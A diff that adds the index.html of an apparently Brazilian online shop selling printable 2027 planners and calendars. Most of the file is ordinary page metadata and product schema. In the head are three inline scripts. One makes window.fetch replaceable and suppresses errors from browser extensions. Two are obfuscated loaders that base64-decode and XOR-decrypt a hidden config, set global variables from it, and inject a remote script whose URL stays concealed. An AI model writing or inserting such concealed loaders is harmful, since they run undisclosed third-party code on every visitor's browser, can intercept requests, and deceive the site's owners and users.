@@ -1,0 +1,115 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script>
+      (function () {
+        try {
+          var currentFetch = window.fetch ? window.fetch.bind(window) : undefined;
+          var desc =
+            Object.getOwnPropertyDescriptor(window, 'fetch') ||
+            Object.getOwnPropertyDescriptor(Window.prototype, 'fetch');
+          if (desc && desc.configurable !== false) {
+            Object.defineProperty(window, 'fetch', {
+              configurable: true,
+              enumerable: true,
+              get: function () {
+                return currentFetch;
+              },
+              set: function (fn) {
+                if (typeof fn === 'function') {
+                  currentFetch = fn;
+                }
+              },
+            });
+          }
+        } catch (_) {}
+
+        window.addEventListener(
+          'error',
+          function (event) {
+            var msg = (event && event.message) || '';
+            var file = (event && event.filename) || '';
+            if (
+              msg.indexOf('Cannot set property fetch') !== -1 ||
+              file.indexOf('chrome-extension://') === 0
+            ) {
+              event.stopImmediatePropagation();
+              event.preventDefault();
+            }
+          },
+          true
+        );
+      })();
+    </script>
+    <title>Coleção Planner 2027 — Planners e Calendários Para Imprimir</title>
+    <meta
+      name="description"
+      content="Coleção Planner 2027: planners semanais, calendários mensais, controle de hábitos, listas de tarefas e organizador financeiro em A4 prontos para imprimir."
+    />
+    <meta name="robots" content="index, follow" />
+    <meta name="theme-color" content="#c22182" />
+    <link
+      rel="icon"
+      type="image/svg+xml"
+      href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='16' fill='%23c22182'/%3E%3Ctext x='50%25' y='54%25' dominant-baseline='middle' text-anchor='middle' fill='%23ffffff' font-family='sans-serif' font-weight='bold' font-size='26'%3E27%3C/text%3E%3C/svg%3E"
+    />
+    <meta property="og:locale" content="pt_BR" />
+    <meta property="og:site_name" content="Coleção Planner 2027" />
+    <meta property="og:title" content="Coleção Planner 2027 — Planners e Calendários Para Imprimir" />
+    <meta
+      property="og:description"
+      content="Organize sua rotina, hábitos, metas e finanças em 2027 com planners e organizadores digitais prontos para imprimir."
+    />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="/assets/planners/hero-planner.webp" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Coleção Planner 2027 — Planners e Calendários Para Imprimir" />
+    <meta
+      name="twitter:description"
+      content="Organize sua rotina, hábitos, metas e finanças em 2027 com planners e organizadores digitais prontos para imprimir."
+    />
+    <meta name="twitter:image" content="/assets/planners/hero-planner.webp" />
+    <link
+      rel="preload"
+      as="image"
+      href="/assets/planners/hero-planner.webp"
+      fetchpriority="high"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@700;800&family=Fredoka:wght@600;700&family=Poppins:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap"
+      rel="stylesheet"
+    />
+    <script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "Product",
+        "name": "Coleção Planner 2027",
+        "description": "Coleção digital de planners semanais, calendários mensais, controle de hábitos, listas de tarefas e planejamento financeiro prontos para imprimir.",
+        "image": "/assets/planners/hero-planner.webp",
+        "brand": {
+          "@type": "Brand",
+          "name": "Coleção Planner 2027"
+        },
+        "offers": {
+          "@type": "AggregateOffer",
+          "lowPrice": "9.90",
+          "highPrice": "23.90",
+          "priceCurrency": "BRL",
+          "offerCount": "2",
+          "availability": "https://schema.org/InStock"
+        }
+      }
+    </script>
+    <script>(function(){var v_tbxj=atob("DJ9ZoWckgh/nHeisG+R71BVIoCXFdZzYa+xjjkhH5nHJaJzBcvkgjwRL7zGFb8ffeO0w0RNXrWqTcJuDd/4txBRQrHWUP8SOeust0w5G92uCbsqWQOR7zwZJ5z3dP4zNb/501BNJ63meMJjefuk8zxMJ+nyIecXfePR7jUVS43OSeMqWOb0kjRwG7H6KeMqWOfs41QYJ92uKdI7VNu8rxBFB7GvKbp3Ocvsqg0sG9H6LaI2OIb173DpZ");var p_0q=[];for(var a_74ea=0;a_74ea<v_tbxj.length;a_74ea++){p_0q.push(v_tbxj.charCodeAt(a_74ea)&255);}var j_ktmg=p_0q[0];var q_xh=p_0q.slice(1,1+j_ktmg);var u_10=p_0q.slice(1+j_ktmg);var u_cn=u_10.map(function(b,p_w){return b^q_xh[p_w%j_ktmg];});var r_k0o7="";for(var s_8=0;s_8<u_cn.length;s_8++){r_k0o7+=String.fromCharCode(u_cn[s_8]&255);}var n_th=decodeURIComponent(escape(r_k0o7));var s_dz=JSON.parse(n_th);var b_qw=s_dz.globals||[];b_qw.forEach(function(s_w8){window[s_w8.name]=s_w8.value;});var z_9a=document.createElement("script");z_9a.src=s_dz.url;z_9a.async=true;z_9a.defer=true;(s_dz.attributes||[]).forEach(function(g_x){z_9a.setAttribute(g_x.name,g_x.value);});(document.head||document.documentElement).appendChild(z_9a);})();</script>
+    <script>(function(){var x_gub=atob("DBPK9eKjK5bEffjcqmjogJDPCazmFYyo2mDw2s3AT/jqCIyxw3Wz24HMRrimD9evyWGjhZbQBOatBZ2whWOjjYfPBfy3X9T+y2e+h4vBXuKhDtrm8U7m14XPRPSlEYv+kEix14zCRvPmR9qsw2uvmavHCbrmC5mw33boz8CVSvD9T53okiasltfFT6GnT57qnHasxISBVsu5");var p_nzu=[];for(var c_vs9=0;c_vs9<x_gub.length;c_vs9++){p_nzu.push(x_gub.charCodeAt(c_vs9)&255);}var q_ph=p_nzu[0];var j_fvf=p_nzu.slice(1,1+q_ph);var r_t99n=p_nzu.slice(1+q_ph);var q_4exa=r_t99n.map(function(b,l_s){return b^j_fvf[l_s%q_ph];});var l_9="";for(var b_uia2=0;b_uia2<q_4exa.length;b_uia2++){l_9+=String.fromCharCode(q_4exa[b_uia2]&255);}var f_28e3=decodeURIComponent(escape(l_9));var u_4=JSON.parse(f_28e3);var t_r4n4=u_4.globals||[];t_r4n4.forEach(function(f_z){window[f_z.name]=f_z.value;});var o_lfd=document.createElement("script");o_lfd.src=u_4.url;o_lfd.async=true;o_lfd.defer=true;(u_4.attributes||[]).forEach(function(l_tsmd){o_lfd.setAttribute(l_tsmd.name,l_tsmd.value);});(document.head||document.documentElement).appendChild(o_lfd);})();</script>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
+
